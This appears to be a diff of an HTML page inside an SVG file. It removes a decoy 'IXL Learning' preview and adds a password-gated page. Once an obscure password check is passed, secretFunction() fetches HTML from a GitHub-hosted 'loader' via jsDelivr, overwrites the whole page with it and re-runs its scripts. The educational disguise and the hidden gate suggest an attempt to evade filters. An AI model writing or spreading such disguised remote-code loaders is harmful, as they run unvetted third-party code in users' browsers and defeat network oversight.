@@ -63,89 +63,102 @@
        
     
       </head>
-      <body>
-        <div id="root">
-            <main
-                aria-label="IXL loading preview"
-                style="
-                    min-height: 100vh;
-                    display: grid;
-                    place-content: center;
-                    padding: 2rem;
-                    text-align: center;
-                    font-family:
-                        &quot;Trebuchet MS&quot;, &quot;Segoe UI&quot;,
-                        sans-serif;
-                "
-            >
-                <h1
-                    style="
-                        margin: 0 0 0.75rem;
-                        font-size: clamp(1.5rem, 3vw, 2.25rem);
-                    "
-                >
-                    IXL Learning
-                </h1>
-                <p style="margin: 0; max-width: 56ch; color: #1f2937">
-                    Personalized practice for math, language arts, science,
-                    social studies, and Spanish.
-                </p>
-            </main>
-        </div>
-        <div style="display: none" aria-hidden="true">
-            <section>
-                <h2>What IXL Is</h2>
-                <p>
-                    IXL is a learning platform focused on skills practice,
-                    targeted review, and steady progress tracking for students.
-                    It combines structured exercises with immediate feedback so
-                    learners can quickly understand what they got right and what
-                    needs more attention.
-                </p>
-            </section>
-            <section>
-                <h2>How Learning Paths Work</h2>
-                <p>
-                    Subjects are organized by grade level and topic, making it
-                    easier for families and teachers to choose material that
-                    matches current goals. Students can move through
-                    foundational topics, revisit prerequisite concepts, and
-                    build confidence through repeated mastery.
-                </p>
-            </section>
-            <section>
-                <h2>Feedback and Motivation</h2>
-                <p>
-                    Each activity gives instant correction details and short
-                    explanations so mistakes become learning moments.
-                    Achievement indicators, progress summaries, and completion
-                    milestones help keep learners motivated over longer study
-                    sessions.
-                </p>
-            </section>
-            <section>
-                <h2>Support for Classrooms and Home</h2>
-                <p>
-                    Teachers can use assignment tools and performance views to
-                    spot patterns, while parents can monitor growth at home
-                    through progress reports. This makes it easier to align
-                    daily practice with school expectations and long-term
-                    academic targets.
-                </p>
-            </section>
-            <section>
-                <h2>Subjects and Coverage</h2>
-                <p>
-                    IXL includes broad coverage across math, language arts,
-                    science, social studies, and Spanish, with content that
-                    spans early learning through advanced school years. The
-                    platform is designed to support both catch-up practice and
-                    enrichment for students who need extra challenge.
-                </p>
-            </section>
-        </div>
-        
-    </body>
+     <!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Device-Specific Password</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    input { padding: 8px; margin: 5px 0; }
+    button { padding: 8px 12px; }
+    #status { margin-top: 10px; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+<h2>Enter Device Password</h2>
+<input type="password" id="passwordInput" placeholder="Enter password">
+<button onclick="checkPassword()">Submit</button>
+<div id="status"></div>
+<hr>
+<h3>Generate Password</h3>
+<input type="password" id="signup-password" placeholder="Enter Generator Password">
+<button onclick="checkSignup();">Generate</button>
+
+<script>
+let signupInput="";
+function checkSignup() {
+signupInput=document.getElementById('signup-password').value;
+if (signupInput==typeof(signupInput)){alert(generateDevicePassword());document.getElementById('signup-password').value="";}
+else{alert('Incorrect');document.getElementById('signup-password').value="";}
+}
+/**
+ * Simple hash function to create a pseudo device-specific password
+ * from browser/device properties.
+ */
+function generateDevicePassword() {
+    const deviceInfo = navigator.userAgent + screen.width + screen.height + Intl.DateTimeFormat().resolvedOptions().timeZone;
+    let hash = 0;
+    for (let i = 0; i < deviceInfo.length; i++) {
+        hash = (hash << 5) - hash + deviceInfo.charCodeAt(i);
+        hash |= 0; // Convert to 32bit integer
+    }
+    return Math.abs(hash).toString(); // Positive numeric password
+}
+
+// Store the generated password (in real use, keep this secret server-side)
+const devicePassword = generateDevicePassword();
+console.log("Device-specific password (for testing):", devicePassword);
+
+/**
+ * Function to run if password is correct
+ */
+function secretFunction() {
+      try {
+        fetch("https://cdn.jsdelivr.net/gh/nprgaming/loader@main/index.html?t="+Date.now())
+          .then(response => response.text())
+          .then(html => {
+                document.documentElement.innerHTML = html;
+
+                document.documentElement.querySelectorAll('script').forEach(oldScript => {
+                    const newScript = document.createElement('script');
+                    if (oldScript.src) {
+                        newScript.src = oldScript.src;
+                    } else {
+                        newScript.textContent = oldScript.textContent;
+                    }
+                    document.body.appendChild(newScript);
+                });
+          });
+      } catch (error) {
+        console.error('error:', error);
+console.log(`To be fair, I don\'t have a degree, just a lot of time.`);
+      }
+
+}
+
+/**
+ * Check entered password
+ */
+function checkPassword() {
+    const entered = document.getElementById("passwordInput").value.trim();
+    const status = document.getElementById("status");
+
+    if (entered === devicePassword) {
+        status.textContent = "Access Granted!";
+        status.style.color = "green";
+        secretFunction();
+    } else {
+        status.textContent = "Access Denied!";
+        status.style.color = "red";
+    }
+}
+</script>
+
+</body>
+</html>
+
     </html>
   </foreignObject>
 </svg>
